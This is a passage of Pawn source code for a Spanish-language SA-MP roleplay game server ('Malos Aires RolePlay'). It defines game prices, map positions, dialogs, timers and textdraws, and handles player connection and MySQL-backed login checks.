#pragma semicolon 1
#define _isamp_debug 0 //Esta linea activa algunos mensajes de log para debug. Debe ser comentada para versiones productivas.

#include <a_samp>
#include <a_npc>
#include <a_mysql>
#include <core>
#include <float>
#include <time>
#include <file>
#include <sscanf2>
#include <foreach>
#include <zcmd>
#include <streamer>
#include <Dini>
#include <cstl>
#include <anti_flood>

forward Float:GetDistanceBetweenPlayers(p1,p2);

//#include <mapandreas>
//Includes  moudulos isamp
#include "isamp-util.inc" 				//Contiene defines b�sicos utilizados en todo el GM
#include "isamp-database.inc" 			//Funciones varias para acceso a datos
#include "isamp-players.inc" 			//Contiene definiciones y l�gica de negocio para todo lo que involucre a los jugadores (Debe ser incluido antes de cualquier include que dependa de playerInfo)
#include "isamp-items.inc" 				//Sistema de items
#include "isamp-inventory.inc" 			//Sistema de inventario y maletero
#include "isamp-mano.inc" 				//Sistema de items en la mano
#include "isamp-toys.inc" 				//Sistema de toys
#include "isamp-zones.inc"              //Informacion de las diferentes zonas y barrios
#include "isamp-vehicles.inc" 			//Sistema de vehiculos
#include "isamp-drugs.inc" 				//Sistema de drogas
#include "isamp-business.inc" 			//Sistema de negocios
#include "isamp-houses.inc" 			//Sistema de casas
#include "isamp-buildings.inc"          //Sistema de edificios
#include "isamp-factions.inc" 			//Sistema de facciones
#include "isamp-jobs.inc" 				//Definiciones y funciones para los JOBS
#include "isamp-armarios.inc" 			//Sistema de armarios en las casas
#include "isamp-slotsystem.inc" 		//Sistema de guardado y control de slots
#include "isamp-keychain.inc" 			//Sistema de llaveros
#include "isamp-thiefjob.inc" 			//Sistema del job de ladron
#include "isamp-tazer.inc" 				//Sistema del tazer
#include "isamp-animations.inc" 		//Sistema de animaciones
#include "isamp-itemspma.inc"			//Sistema de items auxiliares para la pma (conos, barricadas, etc)
#include "isamp-sprintrace.inc"			//Sistema de picadas (carreras)
#include "isamp-gangzones.inc"  		//Sistema de control de barrios
#include "isamp-mapeos.inc"  			//Mapeos del GM
#include "isamp-saludocoordinado.inc" 	//Sistema de saludo coordinado
#include "isamp-descripcionyo.inc" 		//Sistema de descripci�n /yo.
#include "isamp-maletin.inc" 			//sistema maletin
#include "isamp-ascensor.inc" 			//sistema de ascensores del mapeo de departamentos
#include "isamp-objects.inc"            //Sistema de objetos en el suelo
#include "isamp-robobanco.inc"          //Robo a banco.
#include "isamp-carthief.inc"          	//Robo de autos.
#include "isamp-mechanic.inc"          	//Sistemas y comandos de mecanicos
#include "isamp-missions.inc"          	//Sistemas de misiones automaticas
#include "isamp-racesystem.inc"         //Sistema de carreras
#include "isamp-espalda.inc"            //Sistema de espalda/guardado de armas largas
#include "isamp-notebook.inc"           //Sistema de agenda
#include "isamp-policeinputs.inc"       //Sistema de insumos de la pm y side (/pequipo - /sequipo)
#include "isamp-adminobjects.inc"       //Sistema de Objetos para admins.
#include "isamp-mask.inc"       		//Sistema de mascaras con id
#include "isamp-cardealer.inc"          //Concesionarias
#include "isamp-afk.inc"          		//Sistema de AFK
#include "isamp-cmdpermissions.inc"      //Permisos din�micos para comandos

// Configuraciones.
#define GAMEMODE				"MA:RP v1.0.8c"
#define GAMEMODE_USE_VERSION	"No"
#define MAP_NAME				"Malos Aires" 									
#define SERVER_NAME				"Malos Aires RolePlay [0.3z] [ESPA�OL]"
#define WEBSITE					"malosaires.com.ar"
#define VERSION					"BETA" 											// Versi�n.
#define PASSWORD				"" 												// Contrase�a del servidor.
#define SECPASS 	            "ELIMINADO"                                     // Contrase�a para resetear los veh�culos personales del servidor, seteandolos en tipo NONE.
#define TEST_SERVER             0                                               // Solo para el testserver, de lo contrario comentar.

#define HP_GAIN           		2         	                                	// Vida que ganas por segundo al estar hospitalizado.
#define HP_LOSS           		0.1	                                           	// Vida que perd�s por segundo al agonizar.
#define GAS_UPDATE_TIME         15000                                           // Tiempo de actualizacion de la gasolina.
#define MAX_TEXTDRAWS           10
#define MAX_SPAWN_ATTEMPTS 		4 												// Cantidad de intentos de spawn.
#define MAX_LOGIN_ATTEMPTS      5
#define TUT_TIME                10000                                           // Tiempo para reintentar el tutorial.

// Posiciones.
#define POS_BANK_X              1479.6465
#define POS_BANK_Y              -1134.2802
#define POS_BANK_Z              1015.4130
#define POS_BANK_I              1
#define POS_BANK_W              1000

#define POS_MEDIC_DUTY_X      	1131.0615
#define POS_MEDIC_DUTY_Y      	-1321.6823
#define POS_MEDIC_DUTY_Z      	1019.7036

#define POS_HOSP_HEAL_X			1163.6618
#define POS_HOSP_HEAL_Y			-1308.4156
#define POS_HOSP_HEAL_Z			1018.5358

#define POS_POLICE_ARREST_X 	196.4749
#define POS_POLICE_ARREST_Y     168.1084
#define POS_POLICE_ARREST_Z     1002.9252

#define POS_BM1_X               2659.6992
#define POS_BM1_Y               -2056.4814
#define POS_BM1_Z               13.4214
#define POS_BM2_X               1296.0912
#define POS_BM2_Y               -990.3329
#define POS_BM2_Z               32.6260
#define POS_BM3_X               1598.7982
#define POS_BM3_Y               -2137.0635
#define POS_BM3_Z               13.4390

// Dialogs.
#define DLG_LOGIN 				10000
#define DLG_REGISTER        	10001
#define DLG_TUT1                10002
#define DLG_TUT2                10003
#define DLG_TUT3                10004
#define DLG_TUT4                10005
#define DLG_TUT5                10006
#define DLG_TUT6                10007
#define DLG_TUT7                10008
#define DLG_TUT8                10009
#define DLG_TUT9                10010
#define DLG_TUT10               10011
#define DLG_TUT11               10012
#define DLG_TUT12               10013
#define DLG_TUT13               10014
#define DLG_RULES               10015
#define DLG_RULESMSG            10016
#define DLG_JOBS                10017
#define DLG_GUIDE               10018
#define DLG_247                 10019
#define DLG_TUNING_COLOR1       10021
#define DLG_TUNING_COLOR2       10022
#define DLG_TUNING_LLANTAS      10023
#define DLG_CAMARAS_POLICIA     10024
// #define DLG_NOTEBOOK         10025
// #define DLG_NOTEBOOK_2       10026
// #define DLG_NOTEBOOK_3       10027
// #define DLG_BIZ_HARD         10028
// #define DLG_BIZ_ACCESS       10029
#define DLG_DYING		    	10030
// #define DLG_CARDEALER1	    10031
// #define DLG_CARDEALER2	    10032
// #define DLG_CARDEALER3	    10033
// #define DLG_CARDEALER4	    10034
#define DLG_FIRST_LOGIN 		10035

// Tiempos de jail.
#define DM_JAILTIME 			300 	// 5 minutos

// Precios.
#define PRICE_ADVERTISE         80
#define PRICE_FIGHTSTYLE        3000
#define PRICE_TEXT              1
#define PRICE_CALL              20  // Maximo de precio random TODO: Implementar costeo de llamadas segun tiempo
#define PRICE_TAXI              1
#define PRICE_TAXI_INTERVAL		15   // Intervalo de tiempo de la bajada de taximetro (en segundos)
#define PRICE_TAXI_PERPASSENGER 390 // Dinero por pasajero.
#define PRICE_UNLISTEDPHONE     4500
#define PRICE_TREATMENT         500
#define PRICE_HOSP_HEAL        	100
#define PRICE_RADIO             600

// Combustible.
#define PRICE_FULLTANK          300
// 24-7
#define PRICE_CIGARETTES        20
#define PRICE_LIGHTER         	5
#define PRICE_PHONE             500
#define PRICE_ASPIRIN           15

#define HEALTH_ASPIRIN          10

#define PRICE_LIC_GUN           2000
#define PRICE_LIC_DRIVING       400
#define PRICE_LIC_SAILING       4400
#define PRICE_LIC_FLYING        15400
#define PRICE_CLOTHES1          100
#define PRICE_CLOTHES2          1750

// Materiales por unidad.
#define MATS_KNUCKLES           1
#define MATS_KNIFE              3
#define MATS_SHOVEL             5
#define MATS_KATANA             6
#define MATS_GRENADE            25
#define MATS_TEARGAS            12
#define MATS_MOLOTOV            8

// Materiales por arma con 50 balas.
#define MATS_9MM	            25
#define MATS_S9MM	            30
#define MATS_DEAGLE           	30
#define MATS_SHOTGUN            40
#define MATS_SAWNOFF            50
#define MATS_UZI        	    45
#define MATS_MP5	            50
#define MATS_AK47            	60
#define MATS_M4           		65
#define MATS_TEC9            	45
#define MATS_CRIFLE            	45
#define MATS_SRIFLE            	75

// Bodyparts
#define BODY_PART_TORSO         3
#define BODY_PART_GROIN         4
#define BODY_PART_LEFT_ARM      5
#define BODY_PART_RIGHT_ARM     6
#define BODY_PART_LEFT_LEG      7
#define BODY_PART_RIGHT_LEG     8
#define BODY_PART_HEAD          9

//[OTHER DEFINES]
#define ResetMoneyBar 			ResetPlayerMoney
#define UpdateMoneyBar 			GivePlayerMoney

/* Sistema de hambre y sed */
#define BASIC_NEEDS_MAX_TIME   	7000 // En segundos. Tiempo que tarda en bajar de 100 a 0
#define BASIC_NEEDS_UPDATE_TIME 360 // En segundos
#define BASIC_NEEDS_HP_LOSS  	5.0 // Vida que pierde en cada actualizacion si la sed en 0

#define OFFROAD_WHEEL_ID 1025
#define SHADOW_WHEEL_ID 1073
#define MEGA_WHEEL_ID 1074
#define RIMSHINE_WHEEL_ID 1075
#define WIRES_WHEEL_ID 1076
#define CLASSIC_WHEEL_ID 1077
#define TWIST_WHEEL_ID 1078
#define CUTTER_WHEEL_ID 1079
#define SWITCH_WHEEL_ID 1080
#define GROVE_WHEEL_ID 1081
#define IMPORT_WHEEL_ID 1082
#define DOLLAR_WHEEL_ID 1083
#define TRANCE_WHEEL_ID 1084
#define ATOMIC_WHEEL_ID 1085
#define AHAB_WHEEL_ID 1096
#define VIRTUAL_WHEEL_ID 1097
#define ACCESS_WHEEL_ID 1098

#define 						INTERIOR_WEATHER_ID						(1)
#define							MAX_WEATHER_POINTS						(9)

#define SELECTION_ITEMS 	18
#define ITEMS_PER_LINE  	6
#define DIALOG_BASE_X   	75.0
#define DIALOG_BASE_Y   	130.0
#define DIALOG_WIDTH    	550.0
#define DIALOG_HEIGHT   	180.0
#define SPRITE_DIM_X    	70.0
#define SPRITE_DIM_Y    	70.0
//==============================================================================

//====[ETC]=====================================================================
#define PRESSED(%0) 			(((newkeys & (%0)) == (%0)) && ((oldkeys & (%0)) != (%0)))
#define HOLDING(%0) 			((newkeys & (%0)) == (%0))
#define RELEASED(%0) 			(((newkeys & (%0)) != (%0)) && ((oldkeys & (%0)) == (%0)))
//==============================================================================

new
    iGMXTick,
    SIDEGateTimer,
	timersID[24],
	pSpeedoTimer[MAX_PLAYERS],
	// Menus.
	Menu:phoneMenu,
	Menu:licenseMenu,
	// Textdraws.
	Text:textdrawVariables[MAX_TEXTDRAWS],
	Text:RegTDBorder1,
	Text:RegTDBorder2,
	Text:RegTDBackground,
	Text:RegTDTitle,
	Text:TutTDBackground,
	PlayerText:TutTD_Text[MAX_PLAYERS][8],
	PlayerText:RegTDGender[MAX_PLAYERS],
	PlayerText:RegTDSkin[MAX_PLAYERS],
	PlayerText:RegTDAge[MAX_PLAYERS],
	PlayerText:RegTDOrigin[MAX_PLAYERS],
	PlayerText:RegTDArrow[MAX_PLAYERS],
	PlayerText:PTD_Speedo[MAX_PLAYERS],
	PlayerText:PTD_BasicNeeds[MAX_PLAYERS],
	PlayerText:PTD_Timer[MAX_PLAYERS],
	PlayerText:gCurrentPageTextDrawId[MAX_PLAYERS],
	PlayerText:gHeaderTextDrawId[MAX_PLAYERS],
	PlayerText:gBackgroundTextDrawId[MAX_PLAYERS],
	PlayerText:gNextButtonTextDrawId[MAX_PLAYERS],
	PlayerText:gPrevButtonTextDrawId[MAX_PLAYERS],
	PlayerText:gSelectionItems[MAX_PLAYERS][SELECTION_ITEMS],
	gSelectionItemsTag[MAX_PLAYERS][SELECTION_ITEMS],
	gItemAt[MAX_PLAYERS];

new
	
	firstSpawn[MAX_PLAYERS],
	cheater[MAX_PLAYERS],
	
	bool:smoking[MAX_PLAYERS],
	bool:dyingCamera[MAX_PLAYERS],
	
	// Sistema de streams de radios
	bool:hearingRadioStream[MAX_PLAYERS],
	
	// Sistema de apuestas en casino
	bool:isBetingRoulette[MAX_PLAYERS],
	bool:isBetingFortune[MAX_PLAYERS],
	
	// Sistema de entrevistas para CTR-MAN
	InterviewOffer[MAX_PLAYERS],
	bool:InterviewActive[MAX_PLAYERS],
	
	/* Licencia de armas */
	wepLicOffer[MAX_PLAYERS],
	
	// Revision de usuarios
	ReviseOffer[MAX_PLAYERS],
	
	InEnforcer[MAX_PLAYERS],

	//Sistema camaras policia
	bool:usingCamera[MAX_PLAYERS],
	
	// Mec�nico.
	MechanicCall = 999,
	MechanicCallTime[MAX_PLAYERS],
	
	// Taxi/Bus.
	TaxiCall = 999,
	TaxiCallTime[MAX_PLAYERS],
	TaxiAccepted[MAX_PLAYERS],
	TransportDriver[MAX_PLAYERS],
	TransportPassenger[MAX_PLAYERS],
	TransportCost[MAX_PLAYERS],
	TaxiTimer=PRICE_TAXI_INTERVAL,
	
	//Alcoholemia
	DrinksTaken[MAX_PLAYERS],
	BlowingPipette[MAX_PLAYERS],
    OfferingPipette[MAX_PLAYERS],
	
	//Cargando Nafta
	bool:fillingFuel[MAX_PLAYERS],
	
	//Cintur�n de seguridad
	bool:SeatBelt[MAX_PLAYERS],

	lastPoliceCallNumber = 0,
	lastMedicCallNumber = 0,
	Float:lastPoliceCallPos[3],
	Float:lastMedicCallPos[3],
    LastDeath[MAX_PLAYERS],
	DeathSpam[MAX_PLAYERS char],
    AllowAdv[MAX_PLAYERS],
	RegCounter[MAX_PLAYERS],
	gPlayerLogged[MAX_PLAYERS],
	weatherVariables[2],
	gTime[3],
	SpawnAttempts[MAX_PLAYERS],
	FactionRequest[MAX_PLAYERS],
	HospHealing[MAX_PLAYERS],
	Muted[MAX_PLAYERS],
	StartedCall[MAX_PLAYERS],
	OOCStatus = 0,
	TicketOffer[MAX_PLAYERS],
	TicketMoney[MAX_PLAYERS];

new Float:GUIDE_POS[][3] = {
	{1675.1625,-2245.8516,13.5655},
    {1495.5433,-1749.1760,15.4453}
};

new TiempoEsperaMps[MAX_PLAYERS] = 0;

/*new TakeHeadShot[MAX_PLAYERS] = 0;*/

// Pickups
new
	P_BANK,
	P_FIGHT_STYLE,
	P_HOSP_HEAL,
	P_LICENSE_CENTER,
	P_HOSP_DUTY,
	P_POLICE_ARREST,
	P_POLICE_DUTY,
	P_SIDE_DUTY,
	P_JOB_CENTER,
	P_GUIDE[2],
	P_CAR_RENT1,
	P_CAR_RENT2,
	P_CAR_RENT3,
	P_MATS_SHOP,
	P_DRUGFARM_MATS,
	P_TUNE[5],
	P_PRODS_SHOP,
	P_CAR_DEMOLITION,
	P_BLACK_MARKET[3],
	P_CARPART_SHOP,
	P_POLICE_CAMERAS,
	P_INPUTS_SHOP_N,
	P_INPUTS_SHOP_S;

//====[ENUMS]===================================================================

enum pLicInfo {
	lDTaking,
	lDStep,
	lDTime,
	Float:lDMaxSpeed,
};
new playerLicense[MAX_PLAYERS][pLicInfo];

// Timers
forward Float:GetDistance(Float:x1,Float:y1,Float:z1,Float:x2,Float:y2,Float:z2);
forward theftTimer(playerid, type, biz);
forward garbageTimer(playerid, garbcp);
forward robberyCancel(playerid);
forward fuelCar(playerid, refillprice, refillamount, refilltype);
forward fuelCarWithCan(playerid, vehicleid, totalfuel);
forward AntiCheatTimer();
forward AntiCheatImmunityTimer(playerid);
forward globalUpdate();
forward commandPermissionsUpdate();
forward accountTimer();
forward restartTimer(type);
forward vehicleTimer();
forward speedoTimer(playerid);

forward licenseTimer(playerid, lic);
forward fuelTimer();
forward healTimer(playerid);
forward cantSaveItems(playerid);
forward kickTimer(playerid);
forward banTimer(playerid);

forward GiveJobExp(playerid, job, exp);
forward BackupClear(playerid, calledbytimer);
forward CloseGate(gateID);
forward AllowAd(playerid);
forward Unfreeze(playerid);
forward OnPlayerPrivmsg(playerid, recieverid, text[]);
forward SendFactionMessage(faction, color, string[]);
forward SaveAccount(playerid);
forward SetPlayerSpawn(playerid);
forward PayDay(playerid);
forward ResetStats(playerid);
forward ShowStats(playerid, targetid, bool:admin);
forward BanPlayer(playerid, issuerid,reason[]);
forward KickPlayer(playerid,kickedby[MAX_PLAYER_NAME],reason[]);
forward ProxDetectorS(Float:radi, playerid, targetid);
forward KickLog(string[]);
forward PlayerActionLog(string[]);
forward PlayerLocalLog(string[]);
forward TalkLog(string[]);
forward FactionChatLog(string[]);
forward SMSLog(string[]);
forward DonatorLog(string[]);
forward PMLog(string[]);
forward ReportLog(string[]);
forward OOCLog(string[]);
forward HangupTimer(playerid);
forward JailTimer();
forward PhoneAnimation(playerid);
forward GetClosestPlayer(p1);
forward SetPlayerWantedLevelEx(playerid, level);
forward GetPlayerWantedLevelEx(playerid);
forward ResetPlayerWantedLevelEx(playerid);
forward OnPlayerConnectEx(playerid);
forward CopTraceAvailable(playerid);
forward TimeMps(playerid);
forward EndAnim(playerid);
forward AceptarPipeta(playerid);
forward SoplandoPipeta(playerid);
forward RecoverLastShot(playerid);
forward AntecedentesLog(playerid, targetid, antecedentes[]);

//==============================================================================

main() {
    AntiDeAMX();
	return 1;
}

public OnGameModeInit()
{
	print("HELP");
    loadMySQLcfg();
	print("HELP");
	mysql_connect(MYSQL_HOST, MYSQL_USER, MYSQL_DB, MYSQL_PASS);
    LoadTDs();
    LoadMap();
	LoadPickups();
	LoadGangZones();
	loadCmdPermissions();
	
	//MapAndreas_Init(MAP_ANDREAS_MODE_FULL);

	EnableStuntBonusForAll(0);
    DisableInteriorEnterExits();
    AllowInteriorWeapons(1);
	ManualVehicleEngineAndLights();
	new sendcmd[128];

	if (!strcmp("Yes", GAMEMODE_USE_VERSION, true)) { format(sendcmd, sizeof(sendcmd), "%s - %s", GAMEMODE,VERSION); SetGameModeText(sendcmd); }
	else { SetGameModeText(GAMEMODE); }
	format(sendcmd, sizeof(sendcmd), "hostname %s", SERVER_NAME);
	SendRconCommand(sendcmd);
	format(sendcmd, sizeof(sendcmd), "mapname %s", MAP_NAME);
	SendRconCommand(sendcmd);
	format(sendcmd, sizeof(sendcmd), "weburl %s", WEBSITE);
	SendRconCommand(sendcmd);
	if (strlen(PASSWORD) != 0) { format(sendcmd, sizeof(sendcmd), "password %s", PASSWORD); SendRconCommand(sendcmd); }

	AddPlayerClass(0,1958.3783,1343.1572,1100.3746,269.1425,-1,-1,-1,-1,-1,-1);

	LoadServerInfo();
	LoadFactions();
	LoadVehicles();
	LoadHouses();
	LoadJobs();
	LoadBusiness();
	loadBuildings();
	LoadLockersSlotsInfo();
	LoadTrunksSlotsInfo();
	LoadCarDealerships();

    weatherVariables[0] = validWeatherIDs[random(sizeof(validWeatherIDs))];
	//SetWeather(weatherVariables[0]);

	//===================================[TIMERS]===============================
	
	timersID[0] = SetTimer("accountTimer", 1200000, true); 						// 20 min. 	- Guardado de cuentas.
	timersID[1] = SetTimer("fuelTimer", GAS_UPDATE_TIME, true); 				// 15 seg.   - Actualiza la gasolina de los veh�culos.
	timersID[2] = SetTimer("globalUpdate", 1000, true);							// 1 seg.   - Actualiza el score y la hora/fecha.
	timersID[3] = SetTimer("commandPermissionsUpdate", 60000, true);			// 60 seg.  - Refresca los permisos de los comandos
	timersID[5] = SetTimer("JailTimer", 1000, true);                            // 1 seg.   - Actualiza el jail de los jugadores.
	timersID[6] = SetTimer("vehicleTimer", 1000, true);                    		// 1 seg.	- Actualiza motores da�ados y evita explosiones.
	timersID[8] = SetTimer("AntiCheatTimer", 500, true);
	timersID[12] = SetTimer("rentRespawn", 1000 * 60 * 20, true);               // Respawn de veh�culos de renta.
	timersID[13] = SetTimer("UpdatePlayerAdiction", ADICTION_UPDATE_TIME * 1000, true);  	 // 5 min.	- Sistema de drogas.
	timersID[14] = SetTimer("UpdatePlayerBasicNeeds", BASIC_NEEDS_UPDATE_TIME * 1000, true); // 5 min.		- Sistema de hambre y sed.
	timersID[15] = SetTimer("ServerObjectsCleaningTimer", SERVER_OBJECT_UPD_TIME * 60 * 1000, true); // Borrado de objetos con mucho tiempo de vida

	//====[MENUS]===============================================================

	new price[32];

	// Negocio de tel�fonos
	phoneMenu = CreateMenu("Telefonos", 2, 200.0, 100.0, 150.0, 150.0);

	AddMenuItem(phoneMenu, 0, "Telefono");
	AddMenuItem(phoneMenu, 0, "Telefono (sin listar)");

	format(price, sizeof(price), "$%d", PRICE_PHONE);
	AddMenuItem(phoneMenu, 1, price);
	format(price, sizeof(price), "$%d", PRICE_UNLISTEDPHONE);
	AddMenuItem(phoneMenu, 1, price);

	// Centro de licencias
	licenseMenu = CreateMenu("Licencias", 2, 200.0, 100.0, 150.0, 150.0);

	AddMenuItem(licenseMenu, 0, "Lic. de conduccion");
	AddMenuItem(licenseMenu, 0, "Lic. de navegacion");
	AddMenuItem(licenseMenu, 0, "Lic. de vuelo");

	format(price, sizeof(price), "$%d", PRICE_LIC_DRIVING);
	AddMenuItem(licenseMenu, 1, price);
	format(price, sizeof(price), "$%d", PRICE_LIC_SAILING);
	AddMenuItem(licenseMenu, 1, price);
	format(price, sizeof(price), "$%d", PRICE_LIC_FLYING);
	AddMenuItem(licenseMenu, 1, price);
	//==========================================================================
	SetNameTagDrawDistance(30.0);
	ResetServerRacesVariables();
	return 1;
}

public OnGameModeExit() {
	KillTimer(timersID[0]);
	KillTimer(timersID[1]);
	KillTimer(timersID[2]);
	KillTimer(timersID[3]);
	KillTimer(timersID[4]);
	KillTimer(timersID[5]);
	KillTimer(timersID[6]);
	KillTimer(timersID[9]);
	KillTimer(timersID[10]);
	KillTimer(timersID[12]);
	KillTimer(timersID[13]);
	KillTimer(timersID[14]);
	KillTimer(timersID[15]);

	foreach(new i : Player) {
		KillTimer(pSpeedoTimer[i]);
	}
	TextDrawDestroy(RegTDBorder1);
	TextDrawDestroy(RegTDBorder2);
	TextDrawDestroy(RegTDBackground);
	TextDrawDestroy(RegTDTitle);
	TextDrawDestroy(TutTDBackground);
	DestroyAllDynamic3DTextLabels();
	DestroyAllDynamicPickups();
	DestroyAllDynamicObjects();
	DestroyGangZones();
	//mysql_close();
	return 1;
}

public OnPlayerRequestSpawn(playerid) {
	if(gPlayerLogged[playerid] == 1) {
		return 1;
	} else {
	    if(SpawnAttempts[playerid] >= MAX_SPAWN_ATTEMPTS) {
	        KickPlayer(playerid, "el sistema", "intentos repetidos de spawn sin iniciar sesi�n");
			return 1;
	    }
		SpawnAttempts[playerid] ++;
		return 0;
	}
}

public OnPlayerConnect(playerid)
{
	if(AntiFlood(playerid)==0) return 0;	

	ResetStats(playerid);
	SetPlayerCameraPos(playerid, 1466.869506, -1575.771972, 109.123466);
	SetPlayerCameraLookAt(playerid, 1470.403442, -1574.002441, 109.740196);
    // Usamos un timer para evitar que el mensaje "Connected to X" salga luego del resto.
	if(RPName(playerid))
    	SetTimerEx("OnPlayerConnectEx", 300, false, "i", playerid);
	return 1;
}

public OnPlayerConnectEx(playerid)
{
	new name[MAX_PLAYER_NAME],
		query[128];

	name = PlayerName(playerid);

    ClearScreen(playerid);

	// Comprobamos si est� registrado.
	format(query, sizeof(query), "SELECT * FROM `accounts` WHERE `Name` = '%s'", name);
 	mysql_function_query(dbHandle, query, true, "OnPlayerNameCheck", "i", playerid);

 	syncPlayerTime(playerid);
	SetPlayerWeather(playerid, weatherVariables[0]);

	SetPlayerMapIcon(playerid, 98, 1480.9200,-1772.3136,18.7958, 56, 0, MAPICON_LOCAL); // Ayuntamiento.

	SetPlayerMapIcon(playerid, 99, 1470.79, -1177.43, 23.9241, 52, 0, MAPICON_LOCAL); 	// Banco.
	
	removeBuildings(playerid);
	
	// Creamos los textdraws
	for(new i = 0; i < 7; i++) {
		TutTD_Text[playerid][i] = CreatePlayerTextDraw(playerid, 24.000000, 339 + i * 9, " ");
		PlayerTextDrawAlignment(playerid, TutTD_Text[playerid][i], 1);
		PlayerTextDrawBackgroundColor(playerid, TutTD_Text[playerid][i], 255);
		PlayerTextDrawFont(playerid, TutTD_Text[playerid][i], 1);
		PlayerTextDrawLetterSize(playerid, TutTD_Text[playerid][i], 0.340000, 1.000000);
		PlayerTextDrawColor(playerid, TutTD_Text[playerid][i], -1);
		PlayerTextDrawSetOutline(playerid, TutTD_Text[playerid][i], 0);
		PlayerTextDrawSetProportional(playerid, TutTD_Text[playerid][i], 1);
		PlayerTextDrawSetShadow(playerid, TutTD_Text[playerid][i], 1);
		PlayerTextDrawTextSize(playerid, TutTD_Text[playerid][i], 621.000000, 290.000000);
	}
	
	PTD_Speedo[playerid] = CreatePlayerTextDraw(playerid, 525.000000, 404.000000, " ");
	PlayerTextDrawBackgroundColor(playerid, PTD_Speedo[playerid], 255);
	PlayerTextDrawFont(playerid, PTD_Speedo[playerid], 1);
	PlayerTextDrawLetterSize(playerid, PTD_Speedo[playerid], 0.300000, 1.200000);
	PlayerTextDrawColor(playerid, PTD_Speedo[playerid], -1);
	PlayerTextDrawSetOutline(playerid, PTD_Speedo[playerid], 1);
	PlayerTextDrawSetProportional(playerid, PTD_Speedo[playerid], 1);

	PTD_Timer[playerid] = CreatePlayerTextDraw(playerid, 496, 160, " ");
	PlayerTextDrawBackgroundColor(playerid, PTD_Timer[playerid], 255);
	PlayerTextDrawFont(playerid, PTD_Timer[playerid], 1);
	PlayerTextDrawLetterSize(playerid, PTD_Timer[playerid], 0.5, 1.9);
	PlayerTextDrawColor(playerid, PTD_Timer[playerid], -421075226);
	PlayerTextDrawSetOutline(playerid, PTD_Timer[playerid], 0);
	PlayerTextDrawSetProportional(playerid, PTD_Timer[playerid], 1);
	PlayerTextDrawSetShadow(playerid, PTD_Timer[playerid], 1);

	RegTDGender[playerid] = CreatePlayerTextDraw(playerid, 513.000000, 121.000000, "Genero: masculino");
	PlayerTextDrawBackgroundColor(playerid, RegTDGender[playerid], 255);
	PlayerTextDrawFont(playerid, RegTDGender[playerid], 2);
	PlayerTextDrawLetterSize(playerid, RegTDGender[playerid], 0.270000, 1.200000);
	PlayerTextDrawColor(playerid, RegTDGender[playerid], -1);
	PlayerTextDrawSetOutline(playerid, RegTDGender[playerid], 1);
	PlayerTextDrawSetProportional(playerid, RegTDGender[playerid], 1);

	RegTDSkin[playerid] = CreatePlayerTextDraw(playerid, 513.000000, 132.000000, "Apariencia: -");
	PlayerTextDrawBackgroundColor(playerid, RegTDSkin[playerid], 255);
	PlayerTextDrawFont(playerid, RegTDSkin[playerid], 2);
	PlayerTextDrawLetterSize(playerid, RegTDSkin[playerid], 0.270000, 1.200000);
	PlayerTextDrawColor(playerid, RegTDSkin[playerid], -1);
	PlayerTextDrawSetOutline(playerid, RegTDSkin[playerid], 1);
	PlayerTextDrawSetProportional(playerid, RegTDSkin[playerid], 1);

	RegTDAge[playerid] = CreatePlayerTextDraw(playerid, 513.000000, 143.000000, "Edad: -");
	PlayerTextDrawBackgroundColor(playerid, RegTDAge[playerid], 255);
	PlayerTextDrawFont(playerid, RegTDAge[playerid], 2);
	PlayerTextDrawLetterSize(playerid, RegTDAge[playerid], 0.270000, 1.200000);
	PlayerTextDrawColor(playerid, RegTDAge[playerid], -1);
	PlayerTextDrawSetOutline(playerid, RegTDAge[playerid], 1);
	PlayerTextDrawSetProportional(playerid, RegTDAge[playerid], 1);

	RegTDOrigin[playerid] = CreatePlayerTextDraw(playerid, 513.000000, 154.000000, "Origen: -");
	PlayerTextDrawBackgroundColor(playerid, RegTDOrigin[playerid], 255);
	PlayerTextDrawFont(playerid, RegTDOrigin[playerid], 2);
	PlayerTextDrawLetterSize(playerid, RegTDOrigin[playerid], 0.270000, 1.200000);
	PlayerTextDrawColor(playerid, RegTDOrigin[playerid], -1);
	PlayerTextDrawSetOutline(playerid, RegTDOrigin[playerid], 1);
	PlayerTextDrawSetProportional(playerid, RegTDOrigin[playerid], 1);

	RegTDArrow[playerid] = CreatePlayerTextDraw(playerid, 501.000000, 122.000000, "~>~");
	PlayerTextDrawAlignment(playerid, RegTDArrow[playerid], 2);
	PlayerTextDrawBackgroundColor(playerid, RegTDArrow[playerid], 255);
	PlayerTextDrawFont(playerid, RegTDArrow[playerid], 2);
	PlayerTextDrawLetterSize(playerid, RegTDArrow[playerid], 0.260000, 0.899999);
	PlayerTextDrawColor(playerid, RegTDArrow[playerid], -1);
	PlayerTextDrawSetOutline(playerid, RegTDArrow[playerid], 1);
	PlayerTextDrawSetProportional(playerid, RegTDArrow[playerid], 1);
	return 1;
}

forward OnPlayerNameCheck(playerid);
public OnPlayerNameCheck(playerid)
{
    new rows,
		fields,
        string[128],
        result[128],
        name[MAX_PLAYER_NAME],
		PlayerIP[20];

	cache_get_data(rows, fields);

    GetPlayerName(playerid, name, sizeof(name));
	GetPlayerIp(playerid, PlayerIP, 20);

	if(rows == 0)
	{
		SendClientMessage(playerid, COLOR_YELLOW2, "Tu cuenta no est� registrada. Para poder jugar deber�s registrarte en los foros de nuestra web: www.malosaires.com.ar");
        SendClientMessage(playerid, COLOR_YELLOW2, "Dentro de la pagina haz click en el boton de 'Registrar Cuenta' y se te direccionar� automaticamente a la pagina de registro.");
        SendClientMessage(playerid, COLOR_YELLOW2, "En la p�gina encontrar�s toda la informaci�n y los pasos para registrar tu personaje (Necesitar�s tambi�n una cuenta en el foro).");
		KickPlayer(playerid, "el servidor", "cuenta no registrada");
	}
	else
	{
		if(RPName(playerid))
		{
			cache_get_field_content(0, "FirstLogin", result);

			if(strval(result) == 1)
			{
 				format(string, sizeof(string), "** %s (%d) ha iniciado sesi�n por primera vez. IP: %s. Registrado: si. **", name, playerid, PlayerIP);
 				AdministratorMessage(COLOR_GREY, string, 1);
				ShowPlayerDialog(playerid, DLG_FIRST_LOGIN, DIALOG_STYLE_PASSWORD, "�Bienvenido a Malos Aires RolePlay!", "Ingresa a continuaci�n la contrase�a provista\npor el administrador que registr� tu cuenta:", "Ingresar", "");
			}
			else
			{
  				format(string, sizeof(string), "** %s (%d) ha iniciado sesi�n. IP: %s. Registrado: si. **", name, playerid, PlayerIP);
 				AdministratorMessage(COLOR_GREY, string, 1);
				ShowPlayerDialog(playerid, DLG_LOGIN, DIALOG_STYLE_PASSWORD, "�Bienvenido de nuevo!", "Ingresa tu contrase�a a continuaci�n:", "Ingresar", "");
			}
		}
	}
	return 1;
}

forward OnPlayerFirstLogin(playerid);
